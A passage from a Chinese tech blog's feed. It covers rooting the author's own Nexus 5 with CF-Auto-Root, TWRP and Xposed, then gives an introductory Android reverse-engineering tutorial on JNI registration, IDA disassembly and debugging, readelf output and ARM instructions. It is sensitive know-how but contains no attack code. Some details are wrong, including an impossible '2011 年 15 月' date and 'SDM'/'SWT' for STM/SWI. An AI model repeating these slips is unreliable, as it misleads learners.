target="_blank" rel="noopener">CF-Auto-Root-hammerhead-hammerhead-nexus5.zip</a> 并解压进入目录。在 macOS 下时，提供的 fastbootm-mac 的版本过老，使用时会报错：</p><pre><code>$ tools/fastboot-mac --versionfastboot version 09a0d98bebce-android</code></pre><p>本地的 fastboot 版本更新，所以我把 tools 中的工具替换为了本地的 /usr/local/bin/fastboot：</p><pre><code>$ fastboot --versionfastboot version 29.0.2-5738569Installed as /usr/local/bin/fastboot</code></pre><p>然后进入 bootloader，并执行 root-mac.sh：</p><pre><code>$ adb reboot bootloader$ ./root-mac.sh----- CF-Auto-Root-hammerhead-hammerhead-nexus5 -----If you are on Android 5.0 or newer, please make sure the &quot;Allow OEM Unlock&quot;option (if present) is enabled in &quot;Settings-&gt;Developer Options&quot;.If you cannot find &quot;Developer Options&quot; under &quot;Settings&quot;, first go to the&quot;Settings-&gt;About&quot; screen, find the &quot;Build number&quot; entry, and tap it 7 times.----- ----- ----- ----- ----- ----- -----Please make sure your device is in bootloader/fastboot mode before continuing.----- ----- ----- ----- ----- ----- -----***WARNING*** ALL YOUR DATA *MAY* BE WIPED ! ***WARNING***We are going to run the &quot;OEM UNLOCK&quot; command on your device. If your devicewas not previously unlocked, this will wipe all your data !Please watch the screen on your device, user input may be required.You may need to enter your administrator password to continue.Press Ctrl+C to cancel !Press ENTER to continuePassword:----- ----- ----- ----- ----- ----- -----If you just unlocked for the first time, it is advised to boot the device intoAndroid before continuing. This first boot may take several minutes, sometimeseven half an hour.If you decide to boot back into Android first, return your device tobootloader/fastboot mode before continuing again.Press Ctrl+C to cancel !Press ENTER to continue----- ----- ----- ----- ----- ----- -----We will now attempt to boot CF-Auto-Root. You should see a red Android on thescreen of your device in a minute, with scrolling white text on top of it.Sending &#39;boot.img&#39; (15868 KB)                      OKAY [  0.605s]Booting                                            OKAY [  0.121s]Finished. Total time: 0.747sIf nothing happens even after several minutes, something may be wrong.Once CF-Auto-Root is done, it will reboot your device. Keep in mind that yourdevice may reboot a number of times, and it may be a few minutes before youare back into Android. It is important that you do not interrupt this process,unless it takes more than five minutes in total.Press ENTER to continue</code></pre><p>成功后，手机会出现一个红色的安卓标志：</p><p><img src="/pics/Nexus5刷机、Root并安装Xposed框架/4.png" srcset="/img/loading.gif" alt></p><p>打开手机后，会发现多了一个 app 叫 SuperSu。使用 adb 连接，并用 su 命令切换到 root：</p><pre><code>$ adb shellshell@hammerhead:/ $ suroot@hammerhead:/ # iduid=0(root) gid=0(root) context=u:r:init:s0root@hammerhead:/ #</code></pre><h1 id="TWRP"><a href="#TWRP" class="headerlink" title="TWRP"></a>TWRP</h1><p>下载 <a href="https://twrp.me/lg/lgnexus5.html" target="_blank" rel="noopener">twrp-3.3.1-0-hammerhead.img</a>，进入 bootloader，并用 fastboot 刷入这个第三方 Recovery，然后重启：</p><pre><code>$ adb reboot bootloader$ fastboot flash recovery twrp-3.3.1-0-hammerhead.imgSending &#39;recovery&#39; (13290 KB)                      OKAY [  0.630s]Writing &#39;recovery&#39;                                 OKAY [  1.040s]Finished. Total time: 1.863s$ fastboot rebootRebooting                                          OKAY [  0.001s]Finished. Total time: 0.001s</code></pre><h1 id="Xposed"><a href="#Xposed" class="headerlink" title="Xposed"></a>Xposed</h1><p>Android 4.0.3~Android 4.4 的版本不支持 sdk21 及以上的版本，通过直接下载 <a href="https://repo.xposed.info/module/de.robv.android.xposed.installer" target="_blank" rel="noopener">Xposed Installer</a> 来安装 Xposed 框架：</p><pre><code>$ adb install apks/de.robv.android.xposed.installer_v33_36570c.apkPerforming Push Installapks/de.robv.android.xposed.installer_v33_36570c.apk: 1 file pushed. 6.7 MB/s (788771 bytes in 0.113s)    pkg: /data/local/tmp/de.robv.android.xposed.installer_v33_36570c.apkSuccess</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.bodkin.ren/index.php/archives/513/" target="_blank" rel="noopener">https://www.bodkin.ren/index.php/archives/513/</a><br><a href="https://jilu.wiki/d/177" target="_blank" rel="noopener">https://jilu.wiki/d/177</a><br><a href="https://blog.csdn.net/feiniao8651/article/details/70083246/" target="_blank" rel="noopener">https://blog.csdn.net/feiniao8651/article/details/70083246/</a><br><a href="https://forum.xda-developers.com/general/xda-assist/xposed-sdk-19-t3311193" target="_blank" rel="noopener">https://forum.xda-developers.com/general/xda-assist/xposed-sdk-19-t3311193</a><br><a href="https://sspai.com/post/24538" target="_blank" rel="noopener">https://sspai.com/post/24538</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在闲鱼上从羊毛党那里买了部 Nexus 5（代号 hammerhead），记录第一次尝试刷机和 root（一开始不是很懂各种知识，所以没有记录下原本系统的版本等各种信息）。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门（二）</title>
    <link href="blog.b3ale.cn/2020/01/31/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>blog.b3ale.cn/2020/01/31/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2020-01-31T08:10:49.000Z</published>
    <updated>2020-03-20T02:19:38.060Z</updated>
    
    <content type="html"><![CDATA[<p>Android JNI 编程及 ARM 汇编入门。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>Android Studio 3.5.3</p><h1 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h1><p>Android 程序分两层，Java 层和 Native 层。Java 层就是 Java 代码编译为 dex 文件，而 Native 层则是 C++ 代码编译为 so 文件（动态库）。两者使用 JNI（Java Native Interface）来进行链接。相比于 Java，Native 层安全性更加高，隐蔽性更加好，某种情况下效率更加高。Java 是跨平台的语言，而这跨平台的背后都是依靠 Java 虚拟机，虚拟机采用 C/C++ 编写，适配各个系统，通过 JNI 为上层 Java 提供各种服务，保证跨平台性。Java 程序中通过 JVM 加载并调用 JNI 程序来间接地调用目标原生函数。</p><p><img src="/pics/Android逆向入门/二/1.png" srcset="/img/loading.gif" alt></p><p>如果要进行 JNI 开发，直接在 Android Studio 中新建一个 C++ 项目即可。在调试过程中，可以新建一个 <code>log.h</code> 定义几个在 C++ 文件中进行日志输出的函数：</p><pre><code class="cpp">#include &lt;android/log.h&gt;#ifndef LOG_TAG#define LOG_TAG &quot;MY_TAG&quot;#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)#define LOGF(...) __android_log_print(ANDROID_LOG_FATAL, LOG_TAG, __VA_ARGS__)#endif</code></pre><p>在 Java 文件中添加日志输出：</p><pre><code class="java">public class MainActivity extends AppCompatActivity {    ...    @Override    protected void onCreate(Bundle savedInstanceState) {        ...        Log.d(&quot;Debug&quot;, &quot;infomation&quot;);    }    ...}</code></pre><p>在需要调用 JNI 的函数中加载动态库：</p><pre><code class="java">public class MainActivity extends AppCompatActivity {    // Used to load the &#39;native-lib&#39; library on application startup.    static {        System.loadLibrary(&quot;native-lib&quot;);    }    ...}</code></pre><h2 id="Native-函数注册"><a href="#Native-函数注册" class="headerlink" title="Native 函数注册"></a>Native 函数注册</h2><h3 id="静态注册"><a href="#静态注册" class="headerlink" title="静态注册"></a>静态注册</h3><p>静态注册的理解和使用方式简单，出错率低。但必须遵循注册规则，当需要更改类名、包名或者方法时，需要按照之前方法重新生成头文件，灵活性不高。</p><p>Java 文件中的 Native 声明：</p><pre><code class="java">public native String sayHello();</code></pre><p>静态注册在 cpp 文件中通过 JNIEXPORT 和 JNICALL 两个宏定义声明，在虚拟机加载 so 时发现上面两个宏定义的函数时就会链接到对应的 native 方法。so 中的名字为类名 + 函数名的组合，并且自带两个参数，即 <code>JNIEnv* env</code> 和 <code>jclass</code>（static 方法时）/<code>jobject</code>（普通方法时）：</p><pre><code class="cpp">#include &lt;jni.h&gt;#include &lt;string&gt;#include &quot;log.h&quot;extern &quot;C&quot; {JNIEXPORT jstring JNICALLJava_com_assassinq_easycpp_MainActivity_sayHello(JNIEnv *env, jobject obj) {    return env-&gt;NewStringUTF(&quot;Hello World&quot;);}}</code></pre><p>静态注册有一些缺点：</p><ol><li>Native 函数名称特别长，不利于书写；</li><li>每次新增或删除接口时需要重新生成文件，比较繁琐；</li><li>第一次调用时需要根据函数名建立索引，影响效率；</li><li>JNI 层的函数名是由 Java 接口名生成，很容易通过 hook 调用动态库中的函数。</li></ol><h3 id="动态注册"><a href="#动态注册" class="headerlink" title="动态注册"></a>动态注册</h3><p>动态注册在 JNI 层通过重载 <code>JNI_OnLoad()</code> 函数来实现，系统初始化 JNI 在加载时，会调用 <code>JNI_OnLoad()</code>，而卸载时会调用 <code>JNI_UnLoad()</code>。原理是通过自定义方法把 C/C++ 函数映射到 JAVA 定义的方法，不需要通过 JAVA 方法名查找匹配 Native 函数名，也就不需要遵循静态注册的命名规则。</p><p>cpp 文件中的函数定义如下：</p><pre><code class="cpp">jstring sayHi(JNIEnv *env, jobject obj) {    return env-&gt;NewStringUTF(&quot;Hi World&quot;);}</code></pre><p>通过内置函数 <code>RegisterNatives()</code> 实现自定义的注册方法：</p><pre><code class="cpp">static int registerNativeMethods(JNIEnv *env, const char *className, JNINativeMethod *gMethods, int numMethods) {    jclass clazz;    clazz = env-&gt;FindClass(className);    if (clazz == NULL) {        return JNI_FALSE;    }    if (env-&gt;RegisterNatives(clazz, gMethods, numMethods) &lt; 0) {        return JNI_FALSE;    }    return JNI_TRUE;}</code></pre><p>定义 gClassName 和 gMethods 两个变量，分别表示需要查找的类名和需要注册的方法信息：</p><pre><code class="cpp">static const char *gClassName = &quot;com/assassinq/easycpp/MainActivity&quot;;static JNINativeMethod gMethods[] = {        {&quot;sayHi&quot;, &quot;()Ljava/lang/String;&quot;, (void *) sayHi},};</code></pre><p>其中方法信息的结构体如下，第一个变量为方法名，第二个变量为方法签名（字符串类型，以 Smali 代码的方式），第三个变量为对应的函数指针：</p><pre><code class="cpp">typedef struct {    const char* name; // native 的方法名    const char* signature; // 方法签名，例如 ()Ljava/lang/String;    void*       fnPtr; // 函数指针} JNINativeMethod;</code></pre><p>最后重写 <code>JNI_OnLoad()</code> 函数：</p><pre><code class="cpp">JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) {    JNIEnv *env = NULL;    if (vm-&gt;GetEnv((void **)&amp;env, JNI_VERSION_1_6) != JNI_OK) {        LOGE(&quot;This jni version is not supported&quot;);        return -1;    }    if (registerNativeMethods(env, gClassName, gMethods, sizeof(gMethods) / sizeof(gMethods[0])) == JNI_FALSE) {        LOGE(&quot;Unable to register native methods&quot;);        return -1;    }    LOGE(&quot;Methods loaded successfully&quot;);    return JNI_VERSION_1_6;}</code></pre><h2 id="so-动态链接库"><a href="#so-动态链接库" class="headerlink" title="so 动态链接库"></a>so 动态链接库</h2><p>在编译过程中，可以修改 app 目录下的 build.gradle 中的内容，使用 android.defaultConfig.ndk.abiFilters 来指示 Gradle 要构建和打包的 ABI 版本，生成不同架构下的动态链接库：</p><pre><code>android {    ...    defaultConfig {        ...        ndk {            abiFilters &quot;armeabi-v7a&quot;, &quot;arm64-v8a&quot;, &quot;x86&quot;, &quot;x86_64&quot;        }    }    ...}</code></pre><p>so 文件一般存放在 apk 的 lib 目录下（NDK r17 版本开始已经去掉了 armeabi、mips、mips64 的 ABI 支持）：</p><ul><li>armeabi-v7a：第 7 代及以上的 ARM 处理器。2011 年 15 月以后的生产的大部分 Android 设备都使用它。</li><li>arm64-v8a：第 8 代、64 位 ARM 处理器，很少设备，三星 Galaxy S6 是其中之一。</li><li>armabi：第 5 代、第 6 代的 ARM 处理器，早期的手机用的比较多。</li><li>x86：Intel x86（平板、模拟器用得比较多）。</li><li>x86_64：Intel x64（64 位的平板）。</li><li>…</li></ul><h2 id="IDA-反编译-so-文件"><a href="#IDA-反编译-so-文件" class="headerlink" title="IDA 反编译 so 文件"></a>IDA 反编译 so 文件</h2><p>用 IDA 打开编译后的 apk，可以看到 lib 中存在一个 libnative-lib.so：</p><p><img src="/pics/Android逆向入门/二/2.png" srcset="/img/loading.gif" alt></p><p>查看静态注册函数的反编译结果：</p><pre><code class="cpp">int __fastcall Java_com_assassinq_easycpp_MainActivity_sayHello(_JNIEnv *a1){  return _JNIEnv::NewStringUTF(a1, &quot;Hello World&quot;);}</code></pre><p>查看动态注册的函数的反编译结果：</p><pre><code class="cpp">int __fastcall sayHi(_JNIEnv *a1){  return _JNIEnv::NewStringUTF(a1, &quot;Hi World&quot;);}</code></pre><h1 id="IDA-动态调试-apk"><a href="#IDA-动态调试-apk" class="headerlink" title="IDA 动态调试 apk"></a>IDA 动态调试 apk</h1><ol><li>安装 apk 到手机：<code>adb install example.apk</code></li><li>将 IDA 目录下的调试文件 push 到手机上：<code>adb push android_server /data/local/tmp</code></li><li>赋给程序可执行权限：<code>chmod 777 android_server</code></li><li>启动调试服务端：<code>./android_server</code> （自定义设置端口方式：<code>-p23333</code>）</li><li>手机端端口转发至电脑端：<code>adb forward tcp:[pc_port] tcp:[mobile_port]</code></li><li>IDA 调试端口设置：Debugger-&gt;Process option</li><li>启动程序：<code>adb shell am start -D -n packageName/activityName</code></li><li>IDA 挂接到 Native 层：Debugger-&gt;Attach to process…</li><li>打开 monitor，监听并挂接到 JAVA 层：<code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code></li></ol><p><img src="/pics/Android逆向入门/二/3.png" srcset="/img/loading.gif" alt></p><p>PS：如果在 monitor 中没有找到对应的进程，检查一下调试的程序中 AndroidManifest.xml 中是否设置了 <code>android:debuggable=&quot;true&quot;</code>（若没有则修改后并重新打包）。</p><h1 id="动态链接库文件（-so-文件）"><a href="#动态链接库文件（-so-文件）" class="headerlink" title="动态链接库文件（.so 文件）"></a>动态链接库文件（.so 文件）</h1><p>加载顺序：</p><pre><code>init_array -&gt; JNI_OnLoad -&gt; ... -&gt; fini_array</code></pre><h2 id="so-文件查看工具"><a href="#so-文件查看工具" class="headerlink" title="so 文件查看工具"></a>so 文件查看工具</h2><h3 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h3><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>-a</code></td><td style="text-align:center">显示 so 文件的所有信息</td></tr><tr><td style="text-align:center"><code>-h</code></td><td style="text-align:center">显示 ELF 文件头</td></tr><tr><td style="text-align:center"><code>-l</code></td><td style="text-align:center">显示 Program Headers，动态加载时需要的信息</td></tr><tr><td style="text-align:center"><code>-S</code></td><td style="text-align:center">显示 Section Headers，静态加载分析时需要的信息</td></tr><tr><td style="text-align:center"><code>-e</code></td><td style="text-align:center">显示 ELF Header、Section Headers、Program Headers 信息</td></tr><tr><td style="text-align:center"><code>-s</code></td><td style="text-align:center">显示符号表（Symbol Table）</td></tr><tr><td style="text-align:center"><code>-d</code></td><td style="text-align:center">显示动态节区（Dynamic Section）</td></tr></tbody></table><p>显示 ELF 文件头：</p><pre><code class="bash">$ readelf -h libnative-lib.soELF Header:  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00  Class:                             ELF32  Data:                              2&#39;s complement, little endian  Version:                           1 (current)  OS/ABI:                            UNIX - System V  ABI Version:                       0  Type:                              DYN (Shared object file)  Machine:                           ARM  Version:                           0x1  Entry point address:               0x0  Start of program headers:          52 (bytes into file)  Start of section headers:          12932 (bytes into file)  Flags:                             0x5000200, Version5 EABI, soft-float ABI  Size of this header:               52 (bytes)  Size of program headers:           32 (bytes)  Number of program headers:         8  Size of section headers:           40 (bytes)  Number of section headers:         27  Section header string table index: 26</code></pre><p>显示 Program headers：</p><pre><code class="bash">$ readelf -l libnative-lib.soElf file type is DYN (Shared object file)Entry point 0x0There are 8 program headers, starting at offset 52Program Headers:  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align  PHDR           0x000034 0x00000034 0x00000034 0x00100 0x00100 R   0x4  LOAD           0x000000 0x00000000 0x00000000 0x02ab6 0x02ab6 R E 0x1000  LOAD           0x002e3c 0x00003e3c 0x00003e3c 0x001dc 0x001dd RW  0x1000  DYNAMIC        0x002e8c 0x00003e8c 0x00003e8c 0x00110 0x00110 RW  0x4  NOTE           0x000134 0x00000134 0x00000134 0x000bc 0x000bc R   0x4  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10  EXIDX          0x0021f4 0x000021f4 0x000021f4 0x001b8 0x001b8 R   0x4  GNU_RELRO      0x002e3c 0x00003e3c 0x00003e3c 0x001c4 0x001c4 RW  0x4 Section to Segment mapping:  Segment Sections...   00   01     .note.android.ident .note.gnu.build-id .dynsym .dynstr .gnu.hash .hash .gnu.version .gnu.version_d .gnu.version_r .rel.dyn .rel.plt .plt .text .ARM.exidx .ARM.extab .rodata   02     .fini_array .data.rel.ro .dynamic .got .data .bss   03     .dynamic   04     .note.android.ident .note.gnu.build-id   05   06     .ARM.exidx   07     .fini_array .data.rel.ro .dynamic .got</code></pre><p>显示 Section headers：</p><pre><code class="bash">$ readelf -S libnative-lib.soThere are 27 section headers, starting at offset 0x3284:Section Headers:  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al  [ 0]                   NULL            00000000 000000 000000 00      0   0  0  [ 1] .note.android.ide NOTE            00000134 000134 000098 00   A  0   0  4  [ 2] .note.gnu.build-i NOTE            000001cc 0001cc 000024 00   A  0   0  4  [ 3] .dynsym           DYNSYM          000001f0 0001f0 000190 10   A  4   1  4  [ 4] .dynstr           STRTAB          00000380 000380 0001d3 00   A  0   0  1  [ 5] .gnu.hash         GNU_HASH        00000554 000554 00004c 04   A  3   0  4  [ 6] .hash             HASH            000005a0 0005a0 0000b0 04   A  3   0  4  [ 7] .gnu.version      VERSYM          00000650 000650 000032 02   A  3   0  2  [ 8] .gnu.version_d    VERDEF          00000684 000684 00001c 00   A  4   1  4  [ 9] .gnu.version_r    VERNEED         000006a0 0006a0 000040 00   A  4   2  4  [10] .rel.dyn          REL             000006e0 0006e0 0000e8 08   A  3   0  4  [11] .rel.plt          REL             000007c8 0007c8 000088 08  AI  3  20  4  [12] .plt              PROGBITS        00000850 000850 0000e0 00  AX  0   0  4  [13] .text             PROGBITS        00000930 000930 0018c4 00  AX  0   0  4  [14] .ARM.exidx        ARM_EXIDX       000021f4 0021f4 0001b8 08  AL 13   0  4  [15] .ARM.extab        PROGBITS        000023ac 0023ac 0001a4 00   A  0   0  4  [16] .rodata           PROGBITS        00002550 002550 000566 01 AMS  0   0  1  [17] .fini_array       FINI_ARRAY      00003e3c 002e3c 000008 04  WA  0   0  4  [18] .data.rel.ro      PROGBITS        00003e44 002e44 000048 00  WA  0   0  4  [19] .dynamic          DYNAMIC         00003e8c 002e8c 000110 08  WA  4   0  4  [20] .got              PROGBITS        00003f9c 002f9c 000064 00  WA  0   0  4  [21] .data             PROGBITS        00004000 003000 000018 00  WA  0   0  4  [22] .bss              NOBITS          00004018 003018 000001 00  WA  0   0  1  [23] .comment          PROGBITS        00000000 003018 000109 01  MS  0   0  1  [24] .note.gnu.gold-ve NOTE            00000000 003124 00001c 00      0   0  4  [25] .ARM.attributes   ARM_ATTRIBUTES  00000000 003140 000034 00      0   0  1  [26] .shstrtab         STRTAB          00000000 003174 00010f 00      0   0  1Key to Flags:  W (write), A (alloc), X (execute), M (merge), S (strings)  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)  O (extra OS processing required) o (OS specific), p (processor specific)</code></pre><p>显示符号表：</p><pre><code class="bash">$ readelf -s libnative-lib.soSymbol table &#39;.dynsym&#39; contains 25 entries:   Num:    Value  Size Type    Bind   Vis      Ndx Name     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND __cxa_atexit@LIBC (2)     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND __cxa_finalize@LIBC (2)     3: 00000000     0 OBJECT  GLOBAL DEFAULT  UND __stack_chk_guard@LIBC (2)     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@LIBC (2)     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND __android_log_print     6: 00000000     0 OBJECT  GLOBAL DEFAULT  UND __sF@LIBC (2)     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND abort@LIBC (2)     8: 00000000     0 FUNC    GLOBAL DEFAULT  UND fflush@LIBC (2)     9: 00000000     0 FUNC    GLOBAL DEFAULT  UND fprintf@LIBC (2)    10: 00000000     0 FUNC    GLOBAL DEFAULT  UND dladdr@LIBC (3)    11: 00000000     0 FUNC    GLOBAL DEFAULT  UND __aeabi_memclr8    12: 00000000     0 FUNC    GLOBAL DEFAULT  UND __aeabi_memcpy    13: 00000000     0 FUNC    GLOBAL DEFAULT  UND __gnu_Unwind_Find_exidx    14: 00000000     0 FUNC    GLOBAL DEFAULT  UND snprintf@LIBC (2)    15: 00004018     0 NOTYPE  GLOBAL DEFAULT  ABS _edata    16: 00004019     0 NOTYPE  GLOBAL DEFAULT  ABS _end    17: 00000975    36 FUNC    GLOBAL DEFAULT   13 Java_com_assassinq_easycp    18: 00000999    44 FUNC    WEAK   DEFAULT   13 _ZN7_JNIEnv12NewStringUTF    19: 00000b87    72 FUNC    WEAK   DEFAULT   13 _ZN7_JNIEnv15RegisterNati    20: 00000b5d    42 FUNC    WEAK   DEFAULT   13 _ZN7_JNIEnv9FindClassEPKc    21: 00004018     0 NOTYPE  GLOBAL DEFAULT  ABS __bss_start    22: 000009e9   224 FUNC    GLOBAL DEFAULT   13 JNI_OnLoad    23: 00000ac9    52 FUNC    WEAK   DEFAULT   13 _ZN7_JavaVM6GetEnvEPPvi    24: 000009c5    36 FUNC    GLOBAL DEFAULT   13 sayHi</code></pre><p>显示 Dynamic Section：</p><pre><code class="bash">$ readelf -d libnative-lib.soDynamic section at offset 0x2e8c contains 29 entries:  Tag        Type                         Name/Value 0x00000003 (PLTGOT)                     0x3fb0 0x00000002 (PLTRELSZ)                   136 (bytes) 0x00000017 (JMPREL)                     0x7c8 0x00000014 (PLTREL)                     REL 0x00000011 (REL)                        0x6e0 0x00000012 (RELSZ)                      232 (bytes) 0x00000013 (RELENT)                     8 (bytes) 0x6ffffffa (RELCOUNT)                   26 0x00000006 (SYMTAB)                     0x1f0 0x0000000b (SYMENT)                     16 (bytes) 0x00000005 (STRTAB)                     0x380 0x0000000a (STRSZ)                      467 (bytes) 0x6ffffef5 (GNU_HASH)                   0x554 0x00000004 (HASH)                       0x5a0 0x00000001 (NEEDED)                     Shared library: [liblog.so] 0x00000001 (NEEDED)                     Shared library: [libm.so] 0x00000001 (NEEDED)                     Shared library: [libdl.so] 0x00000001 (NEEDED)                     Shared library: [libc.so] 0x0000000e (SONAME)                     Library soname: [libnative-lib.so] 0x0000001a (FINI_ARRAY)                 0x3e3c 0x0000001c (FINI_ARRAYSZ)               8 (bytes) 0x0000001e (FLAGS)                      BIND_NOW 0x6ffffffb (FLAGS_1)                    Flags: NOW 0x6ffffff0 (VERSYM)                     0x650 0x6ffffffc (VERDEF)                     0x684 0x6ffffffd (VERDEFNUM)                  1 0x6ffffffe (VERNEED)                    0x6a0 0x6fffffff (VERNEEDNUM)                 2 0x00000000 (NULL)                       0x0</code></pre><h3 id="SO-Helper"><a href="#SO-Helper" class="headerlink" title="SO Helper"></a>SO Helper</h3><p>无名侠大佬开发的软件。可以用来快速地获取 so 文件的一些基本信息，提供较弱的汇编功能。</p><h1 id="ARM-汇编代码"><a href="#ARM-汇编代码" class="headerlink" title="ARM 汇编代码"></a>ARM 汇编代码</h1><p>ARM 是 ARM 公司的 32 位处理器，其汇编指令的机器码就是 32 位。</p><ol><li>ARM 汇编语言是一门“低级”语言可以和系统的底层相互沟通；</li><li>ARM 汇编语言编写的程序运行速度快，占用内存少；</li><li>ARM 编写的代码难懂，难以维护；</li><li>C 语言能实现的 ARM 汇编语言都能实现；</li><li>ARM 具有 31 个通用寄存器，6 个状态寄存器；</li><li>ARM 处理器支持 7 种运行模式。<ol><li>用户模式：ARM 处理器正常的程序执行状态。</li><li>快速中断模式：用于高速数据传输或通道处理。</li><li>外部中断模式：用于通用的中断处理。</li><li>管理模式：操作系统使用的保护模式。</li><li>数据访问终止模式：当数据或指令预取终止时进如该模式，可用于模拟存储及存储保护。</li><li>系统模式：运行具有特权的操作系统任务。</li><li>未定义指令中止模式：当未定义的指令执行时进入该模式。</li></ol></li></ol><blockquote><p>ARM 汇编难以分析的原因：IDA 自身的缺陷；函数库与类有时无法识别；自身对 ARM 汇编的熟练度。</p></blockquote><h2 id="函数参数传递"><a href="#函数参数传递" class="headerlink" title="函数参数传递"></a>函数参数传递</h2><p>遵循 ATPCS 规则，前 4 个参数使用 R0~R3 传递，剩余参数通过堆栈传递。</p><h2 id="ARM-和-Thumb"><a href="#ARM-和-Thumb" class="headerlink" title="ARM 和 Thumb"></a>ARM 和 Thumb</h2><p>Thumb 是 16 位的 ARM 汇编。一般地，ARM 每行代码占 4 个字节码，Thumb 每个指令占 2 个字节。两者不能混用，但可以通过 BX、BLX 等指令在跳转的时候实现切换。在动态调试的时候，IDA 对 ARM 和 Thumb 的分析会混淆，可以用 Alt+G 来修改相应的识别。</p><h2 id="ARM-寄存器"><a href="#ARM-寄存器" class="headerlink" title="ARM 寄存器"></a>ARM 寄存器</h2><ul><li>R0-R7：通用寄存器</li><li>R8-R10：不常用的通用寄存器</li><li>R11：基质寄存器（FP）</li><li>R12：暂时寄存器（IP）</li><li>R13：堆栈制作（SP）</li><li>R14：链接寄存器（LR）</li><li>CPSR：状态寄存器</li></ul><h2 id="ARM-指令"><a href="#ARM-指令" class="headerlink" title="ARM 指令"></a>ARM 指令</h2><h3 id="寄存器交互指令"><a href="#寄存器交互指令" class="headerlink" title="寄存器交互指令"></a>寄存器交互指令</h3><ul><li>LDR：从存储器中加载数据到寄存器。<ul><li><code>LDR R1, [R2]</code>：把 R2 指向的位置的数据给 R1</li></ul></li><li>STR：把寄存器的数据存储到存储器<ul><li><code>STR R1, [R2]</code>：在 R2 指向的地址，存储 R1</li></ul></li><li>LDM：将存储器的数据加载到一个寄存器列表。<ul><li><code>LDM R0, {R1, R2, R3}</code>：把 R0 中的数据一次加载到 R1、R2、R3</li></ul></li><li>SDM：将一个寄存器列表的数据存储到指定的存储器<ul><li><code>SDM R0, {R1, R2, R3}</code>：把 R1、R2、R3 加载到 R0 单元</li></ul></li><li>PUSH：入栈</li><li>POP：出栈</li></ul><h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><ul><li>MOV：将立即数或寄存器的数据传送到目标寄存器</li></ul><h3 id="数据算数运算指令"><a href="#数据算数运算指令" class="headerlink" title="数据算数运算指令"></a>数据算数运算指令</h3><h4 id="ADD（加法）"><a href="#ADD（加法）" class="headerlink" title="ADD（加法）"></a>ADD（加法）</h4><p>ADD 将把两个操作数加起来，把结果放置到目的寄存器中。操作数 1 是一个寄存器，操作数 2 可以是一个寄存器，被移位的寄存器，或一个立即值。</p><pre><code class="arm">ADD R0, R1, R2 @ R0 = R1 + R2ADD R0, R1, #256 @ R0 = R1 + 256ADD R0, R2, R3, LSL#1 @ R0 = R2 + (R3 &lt;&lt; 1)</code></pre><p>加法可以在有符号和无符号数上进行。</p><ul><li>ADC：带进位的加法</li></ul><h4 id="SUB（减法）"><a href="#SUB（减法）" class="headerlink" title="SUB（减法）"></a>SUB（减法）</h4><p>SUB 用操作数 1 减去操作数 2，把结果放置到目的寄存器中。操作数 1 是一个寄存器，操作数 2 可以是一个寄存器，被移位的寄存器，或一个立即值。</p><pre><code class="arm">SUB R0, R1, R2 @ R0 = R1 - R2SUB R0, R1, #256 @ R0 = R1 - 256SUB R0, R2, R3, LSL#1 @ R0 = R2 - (R3 &lt;&lt; 1)</code></pre><p>减法可以在有符号和无符号数上进行。</p><ul><li>SBC：带进位的减法</li></ul><h4 id="MUL（乘法）和-DIV（除法）"><a href="#MUL（乘法）和-DIV（除法）" class="headerlink" title="MUL（乘法）和 DIV（除法）"></a>MUL（乘法）和 DIV（除法）</h4><ul><li>给出的所有操作数、和目的寄存器必须为简单的寄存器。</li><li>不能对操作数 2 使用立即值或被移位的寄存器。</li><li>目的寄存器和操作数 1 必须是不同的寄存器。</li><li>不能指定 R15 为目的寄存器</li></ul><p>MUL 提供 32 位整数乘法。如果操作数是有符号的，可以假定结果也是有符号的。</p><ul><li>MLA：带累加的乘法</li></ul><p>除法指令 DIV 的条件与乘法类似。</p><ul><li>SDIV：带符号除法</li><li>UDIV：不带符号位除法</li></ul><h3 id="数据逻辑运算指令"><a href="#数据逻辑运算指令" class="headerlink" title="数据逻辑运算指令"></a>数据逻辑运算指令</h3><ul><li>AND：与</li><li>ORR：或</li><li>EOR：异或</li><li>LSL：逻辑左移</li><li>LSR：逻辑右移</li></ul><h3 id="比较指令"><a href="#比较指令" class="headerlink" title="比较指令"></a>比较指令</h3><ul><li>CMP：比较指令</li></ul><h3 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h3><ul><li>SWT：切换用户模式</li><li>DCB：伪指令</li></ul><h3 id="跳转指令"><a href="#跳转指令" 